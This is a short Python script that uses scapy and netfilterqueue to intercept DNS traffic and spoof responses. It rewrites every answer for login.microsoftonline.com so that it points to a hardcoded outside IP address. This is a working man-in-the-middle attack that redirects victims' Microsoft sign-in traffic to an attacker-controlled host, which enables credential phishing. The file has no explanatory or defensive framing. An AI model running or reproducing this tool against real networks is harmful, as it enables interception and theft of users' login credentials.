from scapy.all import *
import netfilterqueue

TARGET_DOMAIN = 'login.microsoftonline.com'
SEND_TO = '3.149.241.54'

def override_packet(packet):
    scapy_packet = IP(packet.get_payload())
    rrname = scapy_packet[DNSRR].rrname.decode()
    rdata = scapy_packet[DNSRR].rdata
    print(f"[SPOOFING] Replacing {rrname} response IP {rdata} with {SEND_TO}")
    # Modify the DNS response to return the fake IP
    scapy_packet[DNS].an = DNSRR(rrname=rrname, rdata=SEND_TO)
    scapy_packet[DNS].ancount = 1

    # Remove checksums and length fields to force recalculation
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum

    # Set the modified packet as the payload
    packet.set_payload(bytes(scapy_packet))
    return packet

def process_packet(packet):
    """Process packets and print them without modification."""
    scapy_packet = IP(packet.get_payload())  # Convert raw packet to Scapy packet
    if scapy_packet[DNS].qr == 0:
        print(f"[PACKET] (type=DNS REQUEST)  {scapy_packet.summary()}")  # Print the packet summary
    elif scapy_packet[DNS].qr == 1:
        rrname = scapy_packet[DNSRR].rrname.decode()
        rdata = scapy_packet[DNSRR].rdata
        print(f"[PACKET] (type=DNS RESPONSE)  {scapy_packet.summary()}")  # Print the packet summary
        if TARGET_DOMAIN in rrname:
            packet = override_packet(packet)
    # Forward the packet unmodified
    packet.accept()

def main():
    """Main function to inspect and forward packets."""
    print("[*] Starting packet inspection...")
    queue = netfilterqueue.NetfilterQueue()

    try:
        # Bind the queue to the process_packet function
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping script.")
    finally:
        queue.unbind()

if __name__ == "__main__":
    main()
